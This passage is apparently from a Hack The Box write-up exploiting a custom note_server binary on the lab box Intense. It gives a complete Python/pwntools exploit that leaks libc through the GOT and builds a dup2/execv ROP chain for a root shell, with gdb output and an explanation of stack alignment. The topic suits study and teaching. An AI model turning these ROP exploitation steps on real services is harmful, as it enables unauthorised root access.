If I attach `gdb` again (or if it’s still attached), I can run `disassemble handle_client`, and I’ll see the call to `write`:

```

0x0000563e09322d27 <+541>:   call   0x563e09322900 <write@plt>

```

That address after `call` is the PLT address of `write`. I can subtract the base and get the offset:

```

gdb-peda$ p 0x563e09322900 - 0x0000563e09322000
$1 = 0x900

```

To get the GOT address, I’ll look at the code that’s called:

```

gdb-peda$ disassemble 0x563e09322900
Dump of assembler code for function write@plt:
   0x0000563e09322900 <+0>:     jmp    QWORD PTR [rip+0x20165a]        # 0x563e09523f60 <write@got.plt>
   0x0000563e09322906 <+6>:     push   0x2
   0x0000563e0932290b <+11>:    jmp    0x563e093228d0
End of assembler dump.

```

The GOT address is 0x563e09523f60. If I look at what’s stored at that address, it’s 0x00007f76cb58b660:

```

gdb-peda$ x/xg 0x563e09523f60
0x563e09523f60 <write@got.plt>: 0x00007f76cb58b660

```

And that is the start of `write` in LIBC:

```

gdb-peda$ x/xi 0x00007f76cb58b660
   0x7f76cb58b660 <__GI___libc_write>:  mov    eax,DWORD PTR fs:0x18

```

The offset from the main base for the `write` entry in the GOT is:

```

gdb-peda$ p 0x563e09523f60 - 0x0000563e09322000
$2 = 0x201f60

```

#### Structure

Now I can form this into an exploit. This time, I’m not going use the index move without writing anything new. Instead, I’ll overflow the buffer. First, I’ll write my payload (including canary, rbp, and ROP chain) into the buffer, then fill the rest with junk. Then I’ll copy from 0, the length of payload, writing over the canary and the return address:

![image-20200711170555271](https://0xdfimages.gitlab.io/img/image-20200711170555271.png)

Since I want the ROP to leak `write`, I’ll need gadgets populate the args. `write` takes [three args](http://codewiki.wikidot.com/c:system-calls:write), so I’ll need gadgets to pop RDI, RSI, and RDX. In `gdb`, `ropgadget` will dump gadgets, and I quickly find `pop rdi, ret` and `pop rsi, pop r15, ret` (I can just put junk into r15). I don’t have a good `pop rdx` gadget. At the time of return, RDX has some large number is in. Since RDX will hold the number of bytes to write, as long as it’s more than eight, I can get what I need and ignore the rest. I’ll need each of these gadgets relative to the program base.

#### Python

I’ll add stage two to the exploit. The `?` word in the diagrams actually always seems to look like another copy of the main RBP, so I’ll just use that.

```

# Stage 2 - Leak libc
log.info("Stage 2: Leak libc")
write_plt = main_base + 0x900
log.success(f"write plt: 0x{write_plt:016x}")
write_got = main_base + 0x201F60
log.success(f"write got: 0x{write_got:016x}")

## Gadgets
# gdb-peda$ dumprop
pop_rdi = p64(main_base + 0xFD3)
pop_rsi_r15 = p64(main_base + 0xFD1)

## write(4, write_got, 8)
payload = p64(main_rbp) + p64(canary) + p64(main_rbp)
payload += pop_rdi + p64(4)
payload += pop_rsi_r15 + p64(write_got) + p64(0)
payload += p64(write_plt)

r = remote("127.0.0.1", 5001)

write_note(payload + b"A" * (200 - len(payload)))
write_note(b"A" * 200)
write_note(b"A" * 200)
write_note(b"A" * 200)
write_note(b"A" * 224)
copy_note(0, len(payload))
show_note()
resp = r.recvall()
r.close()
write_libc = u64(resp[len(payload) + 1024 : len(payload) + 1032])
log.success(f"write libc: 0x{write_libc:016x}")

```

Running now leaks the libc address of write:

```

root@kali# python3 pwn_note_server.py local ERROR
[*] Stage 1: Leak canary, main, and stack
[+] Opening connection to 127.0.0.1 on port 5001: Done
[+] Receiving all data: Done (1.25KB)
[*] Closed connection to 127.0.0.1 port 5001
[+] Canary: 0x13d2ab240ecd5c00
[+] Main RBP: 0x00007ffe862468a0
[+] Main return: 0x0000563e09322f54
[+] Main base: 0x0000563e09322000

[*] Stage 2: Leak libc
[+] write plt: 0x0000563e09322900
[+] write got: 0x0000563e09523f60
[+] Opening connection to 127.0.0.1 on port 5001: Done
[+] Receiving all data: Done (2.14KB)
[*] Closed connection to 127.0.0.1 port 5001
[+] write libc: 0x00007f76cb58b660

```

### Stage 3: Shell

Now I’ll do the same thing as above, but this time, I’ll get a shell using LIBC functions. I’ll use the standard `dup2` to copy stdin, stdout, and stderr into the socket, and then start `/bin/sh`. I’ll call `/bin/sh` with [execv](https://linux.die.net/man/3/execv). In [rope](/2020/05/23/htb-rope.html#stage-2-shell), I used `execve`, but it requires a third parameter, and I don’t have an RDX gadget, so it crashed. I did play with using `system(/bin/sh)`, and it worked locally, but initially failed on remote. I’ll dig on that (and fix it) in [Beyond Root](#beyond-root---execv-vs-system).

#### Get Address Offsets

I’ll need to get the offsets into LIBC for both my local and the remote host. I can get them with `readelf` and `strings`:

```

root@kali# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -e " dup2@@GLIBC" -e " execv@@GLIBC" -e " write@@GLIBC"
   159: 00000000000cb2d0    15 FUNC    GLOBAL DEFAULT   14 execv@@GLIBC_2.2.5
  1014: 00000000000eeeb0    33 FUNC    WEAK   DEFAULT   14 dup2@@GLIBC_2.2.5
  2278: 00000000000ee660   153 FUNC    WEAK   DEFAULT   14 write@@GLIBC_2.2.5
root@kali# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 1881ac /bin/sh

```

I can do the same on Intense (though grepping one by one or the command is too long):

```

Debian-snmp@intense:/home/user$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -e " dup2@@GLIBC"
   999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
Debian-snmp@intense:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " execv@@GLIBC"
   156: 00000000000e4fa0    15 FUNC    GLOBAL DEFAULT   13 execv@@GLIBC_2.2.5 
Debian-snmp@intense:/home/user$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " write@@GLIBC"
  2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
Debian-snmp@intense:/home/user$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh            
 1b3e9a /bin/sh 

```

Subtracting the address of write from the offset will provide the LIBC base address. Then I can add these other offsets to find their addresses.

#### Python

Stage 3 calculates the offsets, builds the ROP payload, and sends it:

```

# Stage 3 - Shell
print()
log.info("Stage 3: Shell")

# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -e " dup2@@GLIBC" -e " execv@@GLIBC" -e " write@@GLIBC"
# 159: 00000000000cb2d0    15 FUNC    GLOBAL DEFAULT   14 execv@@GLIBC_2.2.5
# 1014: 00000000000eeeb0    33 FUNC    WEAK   DEFAULT   14 dup2@@GLIBC_2.2.5
# 2278: 00000000000ee660   153 FUNC    WEAK   DEFAULT   14 write@@GLIBC_2.2.5
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
# 1881ac /bin/sh
dup2_offset = 0xEEEB0
execv_offset = 0xCB2D0
write_offset = 0xEE660
binsh_offset = 0x1881AC

libc_base = write_libc - write_offset
dup2 = p64(libc_base + dup2_offset)
binsh = p64(libc_base + binsh_offset)
execv = p64(libc_base + execv_offset)
log.success("Calculated addresses:")
print(f"    libc_base:          0x{libc_base:016x}")
print(f"    dup2:               0x{u64(dup2):016x}")
print(f"    execv:              0x{u64(execv):016x}")
print(f"    binsh:              0x{u64(binsh):016x}")

payload = p64(main_rbp) + p64(canary) + p64(main_rbp)
# dup2(4, i)
for i in range(3):
    payload += pop_rdi + p64(4)
    payload += pop_rsi_r15 + p64(i) + p64(i)
    payload += dup2
payload += pop_rdi + binsh
payload += pop_rsi_r15 + p64(0) + p64(0)
payload += execv

r = remote("127.0.0.1", 5001)

write_note(payload + b"A" * (250 - len(payload)))
write_note(b"A" * 200)
write_note(b"A" * 200)
write_note(b"A" * 200)
write_note(b"A" * 174)
copy_note(0, len(payload))
show_note()
r.recv(1024 + len(payload))
r.interactive()

```

Running this locally returns a shell:

```

root@kali# python3 pwn_note_server.py
[*] Stage 1: Leak canary, main, and stack
[+] Opening connection to 127.0.0.1 on port 5001: Done
[+] Receiving all data: Done (1.25KB)
[*] Closed connection to 127.0.0.1 port 5001
[+] Canary: 0x13d2ab240ecd5c00
[+] Main RBP: 0x00007ffe862468a0
[+] Main return: 0x0000563e09322f54
[+] Main base: 0x0000563e09322000

[*] Stage 2: Leak libc
[+] write plt: 0x0000563e09322900
[+] write got: 0x0000563e09523f60
[+] Opening connection to 127.0.0.1 on port 5001: Done
[+] Receiving all data: Done (2.14KB)
[*] Closed connection to 127.0.0.1 port 5001
[+] write libc: 0x00007f76cb58b660

[*] Stage 3: Shell
[+] Calculated addresses:
    libc_base:          0x00007f76cb49d000
    dup2:               0x00007f76cb58beb0
    execv:              0x00007f76cb5682d0
    binsh:              0x00007f76cb6251ac
[+] Opening connection to 127.0.0.1 on port 5001: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ hostname
kali

```

### Remote

The only thing that needs to change for this to be remote is the offsets in LIBC. I’ll add a bit of code at the start which looks for a command line parameter for local vs remote:

```

if len(sys.argv) != 2 or sys.argv[1] not in ["local", "remote"]:
    print("Usage: %s [target]\ntarget is local or remote\n" % sys.argv[0])
    sys.exit(1)
target = sys.argv[1]

```

Now I’ll update Stage 3:

```

if target == "local":
    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -e " dup2@@GLIBC" -e " execv@@GLIBC" -e " write@@GLIBC"
    # 159: 00000000000cb2d0    15 FUNC    GLOBAL DEFAULT   14 execv@@GLIBC_2.2.5
    # 1014: 00000000000eeeb0    33 FUNC    WEAK   DEFAULT   14 dup2@@GLIBC_2.2.5
    # 2278: 00000000000ee660   153 FUNC    WEAK   DEFAULT   14 write@@GLIBC_2.2.5
    # strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
    # 1881ac /bin/sh
    dup2_offset = 0xEEEB0
    system_offset = 0x488A0
    execv_offset = 0xCB2D0
    write_offset = 0xEE660
    binsh_offset = 0x1881AC

else:
    # Debian-snmp@intense:/home/user$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " dup2@@GLIBC"
    #   999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
    # Debian-snmp@intense:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " execv@@GLIBC"
    #   156: 00000000000e4fa0    15 FUNC    GLOBAL DEFAULT   13 execv@@GLIBC_2.2.5
    # Debian-snmp@intense:/home/user$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " write@@GLIBC"
    #  2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
    # Debian-snmp@intense:/home/user$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
    # 1b3e9a /bin/sh
    dup2_offset = 0x1109A0
    system_offset = 0x4F440
    execv_offset = 0xE4FA0
    write_offset = 0x110140
    binsh_offset = 0x1B3E9A

```

I’ll kill my local copy of `note_server` and connect the SSH tunnel. Running the script returns a root shell:

```

root@kali# python3 pwn_note_server.py remote
[*] Stage 1: Leak canary, main, and stack
[+] Opening connection to 127.0.0.1 on port 5001: Done
[+] Receiving all data: Done (1.25KB)
[*] Closed connection to 127.0.0.1 port 5001
[+] Canary: 0x984f26b258fbc500
[+] Main RBP: 0x00007ffe177d4a30
[+] Main return: 0x000055ff8fdc1f54
[+] Main base: 0x000055ff8fdc1000

[*] Stage 2: Leak libc
[+] write plt: 0x000055ff8fdc1900
[+] write got: 0x000055ff8ffc2f60
[+] Opening connection to 127.0.0.1 on port 5001: Done
[+] Receiving all data: Done (2.14KB)
[*] Closed connection to 127.0.0.1 port 5001
[+] write libc: 0x00007fc8e64f3140

[*] Stage 3: Shell
[+] Calculated addresses:
    libc_base:          0x00007fc8e63e3000
    dup2:               0x00007fc8e64f39a0
    system:             0x00007fc8e6432440
    execv:              0x00007fc8e64c7fa0
    binsh:              0x00007fc8e6596e9a
[*] Len payload: 216
[+] Opening connection to 127.0.0.1 on port 5001: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)

```

And I can grab `root.txt`:

```

$ cat /root/root.txt
9db17594************************

```

## Beyond Root - execv vs system

### Getting It Working With system

When I couldn’t get `execve` to work because of my lack of RDX gadget, I tired to just use `system`. I calculated the address just like for `execv`, and has a modified ROP:

```

# dup2(4, i)
for i in range(3):
    payload += pop_rdi + p64(4)
    payload += pop_rsi_r15 + p64(i) + p64(i)
    payload += dup2
payload += pop_rdi + binsh
payload += system

```

It worked locally, but then didn’t work remotely. I remember having this same problem in [rope](/2020/05/23/htb-rope.html#stage-2-shell), and then switching to `execve`.

So what’s the difference? `system` ends up forking and then replacing the child process with the new process. `execve` replaces the current process with the command. But none of that explains why it doesn’t work.

It turns out it has to do with stack alignment. I’ll dig in the next section.

Better yet, I can fix the problem by simply starting the ROP with a `ret` gadget. If I define one:

```

ret = p64(main_base + 0x8CE)

```

The later, add that as the first thing done in the ROP after main RBP:

```

payload = p64(main_rbp) + p64(canary) + p64(main_rbp) + ret

# dup2(4, i)
for i in range(3):
    payload += pop_rdi + p64(4)
    payload += pop_rsi_r15 + p64(i) + p64(i)
    payload += dup2
payload += pop_rdi + binsh
payload += system

```

That’s it! It works remotely now.

### Stack Alignment

Adding a `ret` gadget fixed things. Why? It didn’t make intuitive sense to me, so I decided to debug. I added my private key to root’s `authorized_keys` so I could get a good shell. The box author was nice enough to leave `gdb` on Intense:

```

root@intense:~# which gdb
/usr/bin/gdb

```

I installed [peda](https://github.com/longld/peda) by downloading the zip, `scp` to get it to Intense, and then adding the `source` line to root’s `~/.gdbinit` file as in the install instructions.

I added a line to my exploit, `input()` between stage two and three. Now it will hang there until I hit enter, which gives me a change to attach `gdb`, set a breakpoint, so that I can debug that stage and not the first two. I also took the `ret` gadget out of the payload. On letting it run, it crashed:

```

[----------------------------------registers-----------------------------------]
RAX: 0x7fc8e6596e97 --> 0x2f6e69622f00632d ('-c')
RBX: 0x0 
RCX: 0x7fc8e6596e9f --> 0x2074697865006873 ('sh')
RDX: 0x0 
RSI: 0x7fc8e67d06a0 --> 0x0 
RDI: 0x2 
RBP: 0x7ffe177d48a8 --> 0x0 
RSP: 0x7ffe177d4848 ("AAAAAAAA\227nY\346\310\177")
RIP: 0x7fc8e64322f6 (<do_system+1094>:  movaps XMMWORD PTR [rsp+0x40],xmm0)
R8 : 0x7fc8e67d0600 --> 0x0 
R9 : 0x7ffe177d4a30 --> 0x55ff8fdc1f70 (<__libc_csu_init>:      push   r15)
R10: 0x8 
R11: 0x246 
R12: 0x7fc8e6596e9a --> 0x68732f6e69622f ('/bin/sh')
R13: 0x7ffe177d4b10 --> 0x1 
R14: 0x0 
R15: 0x2
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7fc8e64322e6 <do_system+1078>:     movq   xmm0,QWORD PTR [rsp+0x8]
   0x7fc8e64322ec <do_system+1084>:     mov    QWORD PTR [rsp+0x8],rax
   0x7fc8e64322f1 <do_system+1089>:     movhps xmm0,QWORD PTR [rsp+0x8]
=> 0x7fc8e64322f6 <do_system+1094>:     movaps XMMWORD PTR [rsp+0x40],xmm0
   0x7fc8e64322fb <do_system+1099>:     call   0x7fc8e6422110 <__GI___sigaction>
   0x7fc8e6432300 <do_system+1104>:     lea    rsi,[rip+0x39e2f9]        # 0x7fc8e67d0600 <quit>
   0x7fc8e6432307 <do_system+1111>:     xor    edx,edx
   0x7fc8e6432309 <do_system+1113>:     mov    edi,0x3
[------------------------------------stack-------------------------------------]
0000| 0x7ffe177d4848 ("AAAAAAAA\227nY\346\310\177")
0008| 0x7ffe177d4850 --> 0x7fc8e6596e97 --> 0x2f6e69622f00632d ('-c')
0016| 0x7ffe177d4858 ('A' <repeats 12 times>)
0024| 0x7ffe177d4860 --> 0x41414141 ('AAAA')
0032| 0x7ffe177d4868 --> 0x7fc8e6432360 (<cancel_handler>:      push   rbx)
0040| 0x7ffe177d4870 --> 0x7ffe177d4864 --> 0xe643236000000000 
0048| 0x7ffe177d4878 ('A' <repeats 32 times>, "\232nY\346\310\177")
0056| 0x7ffe177d4880 ('A' <repeats 24 times>, "\232nY\346\310\177")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007fc8e64322f6 in do_system (line=0x7fc8e6596e9a "/bin/sh") at ../sysdeps/posix/system.c:125
125     ../sysdeps/posix/system.c: No such file or directory.

```

Some Googling led me to [this post on Stackoverflow](https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul). It is failing at this line:

```

=> 0x7fc8e64322f6 <do_system+1094>:     movaps XMMWORD PTR [rsp+0x40],xmm0

```

Basically, when you call `system` the right way:

> The x86-64 System V ABI guarantees 16-byte stack alignment before a `call`, so libc `system` is allowed to take advantage of that for 16-byte aligned loads/stores.

But I’m not calling `system`. I’m returning into it using ROP, so that guarantee isn’t there.

If I look at the `gdb` output above, I see that RSP is 0x7ffe177d4848, which is not 16 byte aligned (would end in a 0). Each time there’s a `pop` or a `ret` in my ROP, it moves RSP by 8 bytes. By adding another `ret`, it changes the last nibble from 8 to 0, and then it will work.

Given that the exploit works with and without the `ret` on some hosts (like my Kali host), it must be that those hosts are using a libc that aren’t taking advantage of this alignment (though that’s a conclusion I’m guessing at, please do reach out if that’s not the right answer).